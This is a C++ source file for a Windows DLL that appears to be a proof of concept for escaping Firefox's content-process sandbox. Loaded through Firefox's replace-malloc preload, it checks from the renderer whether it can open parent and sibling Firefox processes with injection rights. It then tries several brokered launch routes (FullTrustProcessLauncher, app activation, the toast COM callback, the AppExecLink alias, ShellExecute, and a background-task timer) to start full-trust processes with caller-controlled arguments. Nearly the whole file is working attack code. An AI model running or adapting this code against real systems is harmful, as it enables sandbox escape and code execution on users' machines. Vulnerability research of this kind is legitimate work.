#include "poc_context.h"

#include <appmodel.h>
#include <roapi.h>
#include <shldisp.h>
#include <shellapi.h>
#include <shobjidl.h>
#include <tlhelp32.h>
#include <winrt/Windows.ApplicationModel.h>
#include <winrt/Windows.ApplicationModel.Background.h>
#include <winrt/Windows.Foundation.h>
#include <winrt/base.h>

#include <algorithm>
#include <cwctype>
#include <iterator>
#include <string>
#include <vector>

#ifdef ShellExecute
#  undef ShellExecute
#endif

struct NotificationUserInputData {
  LPCWSTR key;
  LPCWSTR value;
};

MIDL_INTERFACE("53E31837-6600-4A81-9395-75CFFE746F94")
INotificationActivationCallback : public IUnknown {
 public:
  virtual HRESULT STDMETHODCALLTYPE Activate(
      LPCWSTR app_user_model_id, LPCWSTR invoked_arguments,
      const NotificationUserInputData* data, ULONG count) = 0;
};

const CLSID kNotificationActivationClsid = {
    0x916f9b5d,
    0xb5b2,
    0x4d36,
    {0xb0, 0x47, 0x03, 0xc7, 0xa5, 0x2f, 0x81, 0xc8}};

extern "C" __declspec(dllexport) DWORD WINAPI RunPoc(void* raw_context);

namespace {

template <std::size_t N>
void CopyString(wchar_t (&destination)[N], const wchar_t* source) {
  if (!source) {
    destination[0] = L'\0';
    return;
  }
  wcsncpy_s(destination, source, _TRUNCATE);
}

void CaptureCurrentProcess(TokenSnapshot& snapshot) {
  ZeroMemory(&snapshot, sizeof(snapshot));
  snapshot.pid = GetCurrentProcessId();
  IsProcessInJob(GetCurrentProcess(), nullptr, &snapshot.is_in_job);
  CopyString(snapshot.command_line, GetCommandLineW());
  GetModuleFileNameW(nullptr, snapshot.image_path,
                     static_cast<DWORD>(std::size(snapshot.image_path)));

  UINT32 length = static_cast<UINT32>(std::size(snapshot.package_family));
  if (GetCurrentPackageFamilyName(&length, snapshot.package_family) !=
      ERROR_SUCCESS) {
    snapshot.package_family[0] = L'\0';
  }

  length = static_cast<UINT32>(std::size(snapshot.package_full_name));
  if (GetCurrentPackageFullName(&length, snapshot.package_full_name) !=
      ERROR_SUCCESS) {
    snapshot.package_full_name[0] = L'\0';
  }

  HANDLE token = nullptr;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
    return;
  }

  snapshot.is_restricted = IsTokenRestricted(token);

  DWORD value = 0;
  DWORD returned = 0;
  if (GetTokenInformation(token, TokenIsAppContainer, &value, sizeof(value),
                          &returned)) {
    snapshot.is_app_container = value;
  }

  TOKEN_ELEVATION elevation{};
  if (GetTokenInformation(token, TokenElevation, &elevation,
                          sizeof(elevation), &returned)) {
    snapshot.is_elevated = elevation.TokenIsElevated;
  }

  GetTokenInformation(token, TokenIntegrityLevel, nullptr, 0, &returned);
  if (returned) {
    std::vector<BYTE> buffer(returned);
    if (GetTokenInformation(token, TokenIntegrityLevel, buffer.data(),
                            returned, &returned)) {
      const auto label = reinterpret_cast<TOKEN_MANDATORY_LABEL*>(buffer.data());
      const auto count = *GetSidSubAuthorityCount(label->Label.Sid);
      snapshot.integrity_rid =
          *GetSidSubAuthority(label->Label.Sid, count - 1);
    }
  }

  CloseHandle(token);
}

void ProbeFirefoxProcessAccess(LaunchContext& context) {
  context.parent_injection_open_error = ERROR_NOT_FOUND;
  context.parent_injection_access = FALSE;
  context.sibling_injection_open_error = ERROR_NOT_FOUND;
  context.sibling_injection_access = FALSE;

  const DWORD injection_access =
      PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
      PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_OPERATION |
      PROCESS_VM_READ | PROCESS_VM_WRITE;
  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (snapshot == INVALID_HANDLE_VALUE) {
    context.parent_injection_open_error = GetLastError();
    context.sibling_injection_open_error = context.parent_injection_open_error;
    return;
  }

  PROCESSENTRY32W entry{};
  entry.dwSize = sizeof(entry);
  if (Process32FirstW(snapshot, &entry)) {
    do {
      if (entry.th32ProcessID == GetCurrentProcessId()) {
        context.parent_pid = entry.th32ParentProcessID;
        break;
      }
    } while (Process32NextW(snapshot, &entry));
  }

  if (context.parent_pid) {
    SetLastError(ERROR_SUCCESS);
    HANDLE parent = OpenProcess(injection_access, FALSE, context.parent_pid);
    context.parent_injection_access = parent != nullptr;
    context.parent_injection_open_error =
        parent ? ERROR_SUCCESS : GetLastError();
    if (parent) {
      CloseHandle(parent);
    }
  }

  entry = {};
  entry.dwSize = sizeof(entry);
  if (Process32FirstW(snapshot, &entry)) {
    do {
      if (entry.th32ProcessID == GetCurrentProcessId() ||
          entry.th32ProcessID == context.parent_pid ||
          (_wcsicmp(entry.szExeFile, L"firefox.exe") != 0 &&
           _wcsicmp(entry.szExeFile, L"firefox-real.exe") != 0)) {
        continue;
      }
      SetLastError(ERROR_SUCCESS);
      HANDLE sibling =
          OpenProcess(injection_access, FALSE, entry.th32ProcessID);
      if (sibling) {
        context.sibling_injection_access = TRUE;
        context.sibling_injection_open_error = ERROR_SUCCESS;
        context.sibling_injection_pid = entry.th32ProcessID;
        CloseHandle(sibling);
        break;
      }
      context.sibling_injection_open_error = GetLastError();
    } while (Process32NextW(snapshot, &entry));
  }
  CloseHandle(snapshot);
}

DWORD WINAPI RunMappedPoc(void*) {
  // The DLL is loaded while Firefox initializes its allocator. Let that
  // initialization return before this worker performs any C++ allocations.
  Sleep(2000);
  std::wstring command_line = GetCommandLineW();
  std::transform(command_line.begin(), command_line.end(),
                 command_line.begin(),
                 [](wchar_t value) { return std::towlower(value); });
  if (command_line.find(L"-contentproc") == std::wstring::npos) {
    return ERROR_SUCCESS;
  }

  HANDLE mapping = nullptr;
  for (int attempt = 0; attempt < 3600 && !mapping; ++attempt) {
    mapping = OpenFileMappingW(FILE_MAP_READ | FILE_MAP_WRITE, FALSE,
                               kPocContextMappingName);
    if (!mapping) {
      Sleep(50);
    }
  }
  if (!mapping) {
    return ERROR_TIMEOUT;
  }
  auto* context = static_cast<LaunchContext*>(MapViewOfFile(
      mapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, sizeof(LaunchContext)));
  if (!context) {
    const DWORD error = GetLastError();
    CloseHandle(mapping);
    return error;
  }

  DWORD result = ERROR_INVALID_DATA;
  if (context->magic == kPocContextMagic &&
      context->target_pid == GetCurrentProcessId() &&
      InterlockedCompareExchange(&context->state, kPocContextRunning,
                                 kPocContextReady) == kPocContextReady) {
    result = RunPoc(context);
    context->bootstrap_result = result;
    MemoryBarrier();
    InterlockedExchange(&context->state, kPocContextComplete);
  }
  UnmapViewOfFile(context);
  CloseHandle(mapping);
  return result;
}

}  // namespace

extern "C" __declspec(dllexport) DWORD WINAPI RunPoc(void* raw_context) {
  auto* context = static_cast<LaunchContext*>(raw_context);
  if (!context || context->magic != kPocContextMagic) {
    return ERROR_INVALID_PARAMETER;
  }

  context->call_hresult = E_PENDING;
  context->extended_error = S_OK;
  context->launch_result = -1;
  context->app_id_call_hresult = E_PENDING;
  context->app_id_extended_error = S_OK;
  context->app_id_launch_result = -1;
  context->activation_hresult = E_PENDING;
  context->activation_pid = 0;
  context->shell_execute_error = ERROR_IO_PENDING;
  context->shell_execute_pid = 0;
  context->shell_execute_succeeded = FALSE;
  context->app_exec_alias_error = ERROR_IO_PENDING;
  context->app_exec_alias_pid = 0;
  context->app_exec_alias_succeeded = FALSE;
  context->shell_dispatch_hresult = E_PENDING;
  context->notification_activation_hresult = E_PENDING;
  context->background_access_hresult = E_PENDING;
  context->background_access_status = -1;
  context->background_register_hresult = E_PENDING;
  context->background_registered = FALSE;
  CaptureCurrentProcess(context->caller);
  ProbeFirefoxProcessAccess(*context);

  const HRESULT initialize_result = RoInitialize(RO_INIT_MULTITHREADED);
  const bool should_uninitialize = SUCCEEDED(initialize_result);
  if (FAILED(initialize_result) && initialize_result != RPC_E_CHANGED_MODE) {
    context->call_hresult = initialize_result;
    return ERROR_SUCCESS;
  }

  try {
    const auto result =
        winrt::Windows::ApplicationModel::FullTrustProcessLauncher::
            LaunchFullTrustProcessForCurrentAppWithArgumentsAsync(
                context->launch_arguments)
                .get();
    context->launch_result =
        static_cast<std::int32_t>(result.LaunchResult());
    context->extended_error = result.ExtendedError().value;
    context->call_hresult = S_OK;
  } catch (const winrt::hresult_error& error) {
    context->call_hresult = error.code().value;
  } catch (...) {
    context->call_hresult = E_FAIL;
  }

  // Exercise the API's separate package-relative application-ID overload.
  // This reaches a distinct broker entry point and avoids relying on Windows
  // to infer the current application ID from the renderer token.
  if (context->application_user_model_id[0] != L'\0') {
    std::wstring application_id = context->application_user_model_id;
    const auto separator = application_id.find_last_of(L'!');
    if (separator != std::wstring::npos && separator + 1 < application_id.size()) {
      application_id.erase(0, separator + 1);
      try {
        const auto result =
            winrt::Windows::ApplicationModel::FullTrustProcessLauncher::
                LaunchFullTrustProcessForAppWithArgumentsAsync(
                    application_id.c_str(), context->launch_arguments)
                    .get();
        context->app_id_launch_result =
            static_cast<std::int32_t>(result.LaunchResult());
        context->app_id_extended_error = result.ExtendedError().value;
        context->app_id_call_hresult = S_OK;
      } catch (const winrt::hresult_error& error) {
        context->app_id_call_hresult = error.code().value;
      } catch (...) {
        context->app_id_call_hresult = E_FAIL;
      }
    }
  }

  // Exercise the packaged-app activation broker from the same renderer token.
  // This OS path is independent of FullTrustProcessLauncher and accepts an
  // AUMID plus a caller-controlled argument string.
  if (context->application_user_model_id[0] != L'\0') {
    IApplicationActivationManager* manager = nullptr;
    HRESULT result = CoCreateInstance(
        CLSID_ApplicationActivationManager, nullptr, CLSCTX_INPROC_SERVER,
        IID_PPV_ARGS(&manager));
    if (SUCCEEDED(result)) {
      result = manager->ActivateApplication(
          context->application_user_model_id, context->launch_arguments,
          AO_NONE, &context->activation_pid);
      manager->Release();
    }
    context->activation_hresult = result;
  }

  // The package also registers Mozilla's toast-activation COM surrogate. Its
  // callback accepts newline-delimited launch data and starts firefox.exe.
  if (context->notification_profile[0] != L'\0') {
    INotificationActivationCallback* callback = nullptr;
    HRESULT result = CoCreateInstance(
        kNotificationActivationClsid, nullptr, CLSCTX_LOCAL_SERVER,
        IID_PPV_ARGS(&callback));
    if (SUCCEEDED(result)) {
      const std::wstring invoked_arguments =
          std::wstring(L"program\nwinfire\nprofile\n") +
          context->notification_profile;
      result = callback->Activate(context->application_user_model_id,
                                  invoked_arguments.c_str(), nullptr, 0);
      callback->Release();
    }
    context->notification_activation_hresult = result;
  }

  const std::wstring shell_target =
      std::wstring(L"shell:AppsFolder\\") +
      context->application_user_model_id;

  // Call the package's AppExecLink explicitly. This is resolved by the app
  // activation service rather than by normal executable search.
  if (context->app_exec_alias_arguments[0] != L'\0') {
    wchar_t local_app_data[32768]{};
    const DWORD local_app_data_length = GetEnvironmentVariableW(
        L"LOCALAPPDATA", local_app_data,
        static_cast<DWORD>(std::size(local_app_data)));
    if (local_app_data_length > 0 &&
        local_app_data_length < std::size(local_app_data)) {
      const std::wstring alias_path =
          std::wstring(local_app_data) +
          L"\\Microsoft\\WindowsApps\\firefox.exe";
      std::wstring command_line = L"\"" + alias_path + L"\" " +
                                  context->app_exec_alias_arguments;
      STARTUPINFOW startup{};
      startup.cb = sizeof(startup);
      PROCESS_INFORMATION process{};
      SetLastError(ERROR_SUCCESS);
      context->app_exec_alias_succeeded = CreateProcessW(
          alias_path.c_str(), command_line.data(), nullptr, nullptr, FALSE,
          CREATE_UNICODE_ENVIRONMENT, nullptr, nullptr, &startup, &process);
      context->app_exec_alias_error =
          context->app_exec_alias_succeeded ? ERROR_SUCCESS : GetLastError();
      if (process.hProcess) {
        context->app_exec_alias_pid = process.dwProcessId;
        CloseHandle(process.hProcess);
      }
      if (process.hThread) {
        CloseHandle(process.hThread);
      }
    } else {
      context->app_exec_alias_error = GetLastError();
    }
  }

  // Ask the shell namespace to activate the packaged app. Keep this separate
  // from IApplicationActivationManager because ShellExecute has its own broker
  // and caller checks.
  if (context->shell_execute_arguments[0] != L'\0') {
    SHELLEXECUTEINFOW info{};
    info.cbSize = sizeof(info);
    info.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
    info.lpVerb = L"open";
    info.lpFile = shell_target.c_str();
    info.lpParameters = context->shell_execute_arguments;
    info.nShow = SW_HIDE;
    SetLastError(ERROR_SUCCESS);
    context->shell_execute_succeeded = ShellExecuteExW(&info);
    context->shell_execute_error =
        context->shell_execute_succeeded ? ERROR_SUCCESS : GetLastError();
    if (info.hProcess) {
      context->shell_execute_pid = GetProcessId(info.hProcess);
      CloseHandle(info.hProcess);
    }
  }

  // Exercise the Shell.Application automation broker as a distinct route.
  if (context->shell_dispatch_arguments[0] != L'\0') {
    IShellDispatch2* shell = nullptr;
    HRESULT result = CoCreateInstance(
        CLSID_Shell, nullptr, CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER,
        IID_PPV_ARGS(&shell));
    if (SUCCEEDED(result)) {
      BSTR file = SysAllocString(shell_target.c_str());
      VARIANT args{};
      args.vt = VT_BSTR;
      args.bstrVal = SysAllocString(context->shell_dispatch_arguments);
      VARIANT empty{};
      empty.vt = VT_EMPTY;
      VARIANT show{};
      show.vt = VT_I4;
      show.lVal = SW_HIDE;
      result = shell->ShellExecute(file, args, empty, empty, show);
      SysFreeString(args.bstrVal);
      SysFreeString(file);
      shell->Release();
    }
    context->shell_dispatch_hresult = result;
  }

  // The direct launch is expected to be denied for a Firefox content token.
  // Test the separate package background-task route introduced by the same
  // autoland commit: if this restricted caller can register an attacker-named
  // timer, Windows will later activate Mozilla's declared AppContainer entry
  // point, which calls FullTrustProcessLauncher on the package's behalf.
  if (context->background_task_name[0] != L'\0') {
    try {
      using namespace winrt::Windows::ApplicationModel::Background;
      const auto access_status =
          BackgroundExecutionManager::RequestAccessAsync().get();
      context->background_access_status =
          static_cast<std::int32_t>(access_status);
      context->background_access_hresult = S_OK;
    } catch (const winrt::hresult_error& error) {
      context->background_access_hresult = error.code().value;
    } catch (...) {
      context->background_access_hresult = E_FAIL;
    }

    try {
      using namespace winrt::Windows::ApplicationModel::Background;
      BackgroundTaskBuilder builder;
      builder.Name(context->background_task_name);
      builder.TaskEntryPoint(L"Mozilla.MsixComServer.BackgroundTaskHost");
      builder.SetTrigger(TimeTrigger(15, true));
      const auto registration = builder.Register();
      context->background_registered = static_cast<bool>(registration);
      context->background_register_hresult = S_OK;
    } catch (const winrt::hresult_error& error) {
      context->background_register_hresult = error.code().value;
    } catch (...) {
      context->background_register_hresult = E_FAIL;
    }
  }

  if (should_uninitialize) {
    RoUninitialize();
  }
  return ERROR_SUCCESS;
}

// Firefox's supported replace-malloc loader resolves this export after it
// loads the test DLL. Leaving the allocator table untouched makes the DLL a
// benign preload whose only work is the sandbox-boundary probe above.
extern "C" __declspec(dllexport) void replace_init(void*, void**) {}

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, void*) {
  if (reason == DLL_PROCESS_ATTACH) {
    DisableThreadLibraryCalls(instance);
  }
  return TRUE;
}
